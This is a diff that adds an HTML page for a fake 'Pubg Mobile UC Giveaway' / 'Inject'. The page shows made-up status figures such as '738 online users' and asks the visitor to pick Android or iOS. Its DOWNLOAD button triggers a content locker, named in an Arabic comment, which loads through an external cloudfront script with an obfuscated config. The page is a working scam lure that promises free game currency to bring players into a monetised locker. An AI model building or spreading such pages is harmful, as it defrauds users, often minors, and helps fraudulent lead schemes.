@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="referrer" content="no-referrer">
+  <title>Pubg Mobile UC</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://cdn1.epicgames.com/spt-assets/53ec4985296b4facbe3a8d8d019afba9/pubg-battlegrounds-16v1j.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: 'Arial', sans-serif;
+    }
+    
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 0 25px rgba(0,0,0,0.3);
+      backdrop-filter: blur(5px);
+    }
+    
+    .logo {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    
+    .highlight {
+      color: #ff3cac;
+    }
+    
+    .subtitle {
+      color: #888;
+      margin: 10px 0 20px;
+    }
+    
+    .info {
+      font-size: 14px;
+      color: #444;
+      margin-bottom: 20px;
+    }
+    .info .green {
+      color: green;
+      font-weight: bold;
+    }
+    .label {
+      font-weight: bold;
+    }
+    
+    .select {
+      margin: 20px 0 10px;
+      font-weight: bold;
+    }
+    
+    .buttons button {
+      margin: 5px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      background: #f0f0f0;
+      font-weight: bold;
+      transition: all 0.2s;
+    }
+    .buttons button.active {
+      background: #ff3cac;
+      color: white;
+      box-shadow: 0 0 10px #ff3cac;
+    }
+    
+    .continue-btn {
+      margin-top: 20px;
+      padding: 12px 30px;
+      background: #9b00e8;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 16px;
+      transition: 0.3s;
+    }
+    .continue-btn:hover {
+      background: #7a00c2;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- لوجو Fall Guys من Imgur -->
+    <img src="https://images.sftcdn.net/images/t_app-icon-m/p/726ff3e6-55b7-4b6b-9183-05becc60bc05/189327238/pubg-mobile-logo" alt="Fall Guys Logo" class="logo"/>
+    
+    <h1>Inject<br><span class="highlight">Pubg Mobile UC Giveaway</span></h1>
+    <p class="subtitle">• Giveaway •</p>
+
+    <div class="info">
+      <div><span class="label">Status:</span> <span class="green">Online</span></div>
+      <div><span class="label">Last Update:</span> 13 Apr 2025</div>
+      <div><span class="label">Online Users:</span> 738</div>
+    </div>
+
+    <p class="select">Select your device system.</p>
+    <div class="buttons">
+      <button id="androidBtn">ANDROID</button>
+      <button id="iosBtn">IOS</button>
+    </div>
+
+    <button class="continue-btn" id="continueBtn">DOWNLOAD</button>
+  </div>
+
+  <script>
+    let selected = null;
+
+    document.getElementById('androidBtn').addEventListener('click', function() {
+      selected = 'android';
+      this.classList.add('active');
+      document.getElementById('iosBtn').classList.remove('active');
+    });
+
+    document.getElementById('iosBtn').addEventListener('click', function() {
+      selected = 'ios';
+      this.classList.add('active');
+      document.getElementById('androidBtn').classList.remove('active');
+    });
+
+    document.getElementById('continueBtn').addEventListener('click', function() {
+      if (selected) {
+        // تشغيل الكونتنت لوكر عند النقر على زر التحميل
+        _CJ();
+      } else {
+        alert("Please select your device first!");
+      }
+    });
+  </script>
+  <script type="text/javascript">
+    var rMeHE_buE_iuXQVc={"it":4208347,"key":"77c33"};
+</script>
+<script src="https://d2v7l2267atlz5.cloudfront.net/5a18b8d.js"></script>
+</body>
+</html>
